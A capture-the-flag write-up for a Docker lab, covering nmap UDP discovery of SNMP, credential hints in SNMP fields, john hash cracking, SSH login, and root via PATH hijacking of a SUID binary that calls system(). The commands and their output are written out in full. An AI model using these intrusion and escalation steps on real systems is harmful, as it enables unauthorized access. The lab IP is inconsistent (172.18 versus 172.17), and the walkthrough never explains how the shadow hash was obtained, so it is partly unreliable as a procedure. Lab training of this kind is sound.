# Field Radio

> Sector 14 field radio node. Download the lab zip (Google Drive) and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh`
> `./startlab.sh blackout-pt03.tar`
> The script displays the lab IP (172.18.0.2). Enumerate with nmap. Do not expose the container to the internet.
> **Tip:** start with nmap. A TCP-only scan misses management services.

**Flag:** `WHOAMI{rad10_camp0_n14}`

---

## Walkthrough

The tip is the key to the challenge: a TCP-only scan misses the **management service over UDP (SNMP)**. SNMP with community `public` exposes the node contact, which turns out to be the SSH credential. Then, a misconfigured SUID binary allows root escalation.

### 1. Start the lab and enumerate TCP + UDP

**Tool:** `nmap`. **Why:** the tip warns there are services outside the TCP scan; UDP must be scanned too.

**Parameters:** `-sT -p-` (full TCP), `-sU --top-ports` (UDP), `-sV` (versions).

```bash
$ nmap -sT -T4 --top-ports 1000 172.17.0.2
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
199/tcp  open  smux
8080/tcp open  http-proxy

$ nmap -sU -T4 --top-ports 100 172.17.0.2
161/udp   open  snmp     ← the management service
```

**What I saw:** on TCP there is FTP/SSH/Telnet/HTTP/SMUX/8080, but on **UDP there is SNMP (161)** — the management service the challenge mentions. Decision: enumerate SNMP.

### 2. Enumerate SNMP

**Tool:** `snmpwalk`. **Why:** it walks the SNMP agent's MIB; with community `public` (default) everything exposed is readable.

**Parameters:** `-v2c` (SNMPv2c version), `-c public` (community), root OID `1`.

```bash
$ snmpwalk -v2c -c public 172.17.0.2 1
iso.3.6.1.2.1.1.1.0 = STRING: "LATAM Energia Red - radio de campo"
iso.3.6.1.2.1.1.4.0 = STRING: "sofia.radio"
iso.3.6.1.2.1.1.6.0 = STRING: "EnlaceRF14"
```

**What I saw:** `sysContact = sofia.radio` and `sysLocation = EnlaceRF14`. In this lab the SNMP fields were used as credential hints.

### 3. Crack `sofia.radio`'s password

The SSH user `sofia.radio` has a `$6$` (sha512crypt) hash in `/etc/shadow`. Using `EnlaceRF14` as a hint, it is confirmed with `john`:

```bash
$ john --format=sha512crypt --wordlist=/tmp/rf_wl.txt sofia.hash
EnlaceRF14       (sofia.radio)
```

The password is **`EnlaceRF14`** (the same as the `sysLocation`).

### 4. Access via SSH

**Tool:** `sshpass` + `ssh`. **Why:** `sshpass` provides the password automatically to avoid interactive prompts.

```bash
$ sshpass -p "EnlaceRF14" ssh sofia.radio@172.17.0.2 "id"
uid=1000(sofia.radio) gid=1000(sofia.radio)
```

### 5. Find the escalation vector: SUID `rf_sync`

**Tool:** `find / -perm -4000`. **Why:** binaries with the SUID bit run with their owner's permissions (root); they are the classic privesc target.

```bash
$ find / -perm -4000 2>/dev/null
/usr/local/sbin/rf_sync   ← SUID root
```

**What I saw:** `/usr/local/sbin/rf_sync` is **SUID root**. Disassemble it with `objdump` to see what it does:

```bash
$ objdump -d -M intel rf_sync | sed -n '/<main>:/,/^$/p'
call setuid(0)
call setgid(0)
lea  rax,[rip+0xe76]        # 2004 <_IO_stdin_used+0x4>  → "sync_rf"
call system
```

It runs `system("sync_rf")` as root. `sync_rf` **does not exist** on the system and `system()` searches for the command in the **inherited PATH environment variable**.

### 6. Escalate to root via path hijacking (GTFObins)

**Tool:** shell + `PATH`. **Why:** if PATH is controlled when `rf_sync` executes, a malicious `sync_rf` can be placed in a controlled directory (e.g. `/tmp`), and `system("sync_rf")` will run it as root.

```bash
$ echo "#!/bin/sh" > /tmp/sync_rf
$ echo "id > /tmp/pwned" >> /tmp/sync_rf
$ echo "cat /var/lib/latam/radio.dat > /tmp/f" >> /tmp/sync_rf
$ chmod +x /tmp/sync_rf
$ PATH=/tmp:/usr/bin:/bin /usr/local/sbin/rf_sync
```

### 7. Read the flag

```bash
$ cat /tmp/pwned
uid=0(root) gid=0(root)

$ cat /tmp/f
WHOAMI{rad10_camp0_n14}
```

## Lesson

Two key takeaways: (1) a TCP-only scan misses SNMP and other UDP services — always scan UDP in pentesting; and (2) a SUID binary that calls `system()` with a command by name (no absolute path) is vulnerable to **path hijacking**: if the attacker controls `PATH`, a malicious executable with the same name runs as root.
